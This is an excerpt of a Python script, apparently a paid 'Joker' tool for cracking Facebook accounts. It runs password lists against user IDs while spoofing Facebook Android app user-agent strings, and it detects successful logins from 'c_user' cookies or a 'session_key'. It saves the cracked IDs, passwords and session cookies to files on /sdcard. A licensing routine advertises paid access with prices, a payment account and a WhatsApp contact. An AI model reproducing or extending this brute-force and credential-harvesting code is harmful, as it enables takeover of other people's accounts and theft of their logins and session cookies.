...
def menu():
                        ...
                        if xd in ['1','01']:
                                clear()
                                print(' Put file example:  /sdcard/Joker.txt  etc..')
                                linex()
...
def ffb(ids,names,passlist):
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        fbap = random.choice(['357.0.0.4.127','212.0.0.7.144','393.0.0.3.188','312.0.0.4.133','738.0.0.11.397','60.0.0.16.76','419.0.0.20.71','504.0.0.28482','354.0.0.8.108','405.0.0.16.112','414.0.0.30.113','400.0.0.37.76','414.0.0.30.113','408.1.0.16.113'])
                        ...
                        #########################################################################ua  = '[FBAN/FB4A;FBAV/'+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,313)) +';FBBV/'+str(random.randint(11111111,77777777))+';[FBAN/FB4A;FBAV/201.0.0.8.128;FBBV/586781059;FBDM/{density=3.4,width=1080,height=1410};FBLC/ro_RO;FBRV/0;FBCR/Nepal Telecom;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/M2007J20CG;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]'
                        ua = '[FBAN/FB4A;FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.4,width=1080,height=1489};FBLC/en_US;FBRV/'+fbrv+';FBCR/Jio 4G;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/M2012K11AG;FBSV/'+fbsv+';FBOP/1;FBCA/arm64-v8a:;]'      
                        ...
                        if "c_user" in VEER:
                                ...
                                print(f'\r\r\x1b[1;92m[Joker-OK] %s | %s'%(ids,pas))
                                ...
                                if 'y' in pcp:
                                        print('\r\r\x1b[1;93m[Joker-CP]  '+ids+' | '+pas+'\033[1;97m')
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        open('/sdcard/Joker-COKI-OK.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/Joker-OK.txt','a').write(str(uid)+'|'+pas+'\n')                                        
                                        oks.append(str(uid))
                                        break
...
def approval():
  ...
  sxb = 'Joker'
  try:
    httpCaht = requests.get(f'https://raw.githubusercontent.com/Joker/paid/main/Saba.txt').text
    if id in httpCaht:
      ...
      print('\033[1;37m----------------------------------------------')
      print(" Please Don't come for free and trial")
      print(" 15-Days Price   : 500")
      print(" 7-Days Price    : 350")
      print(" 1-Month Price   : 800")
      print(" Other Countries : 5$ for Weekly  ")
      print(" Other Countries : 8$ For Monthly")
      print(" Easypaisa account 03485738314 Name Muhammad Adnan")
      print(" Binnance Account 762622350")
      print(" if you buy paid Then Press enter")
      print('\033[1;37m----------------------------------------------')
      input('\033[1;37m Press Enter For Contact To Admin ')
      tks = ('Hello%20Mr-Joker%20Sir%20!%20Please%20Approve%20My%20Key%20The%20King%20Key%20Is%20:%20'+id);os.system('am start https://api.whatsapp.com/send?phone=+923485738314&text=')
      time.sleep(1)
      approval()
  except:
    sys.exit()
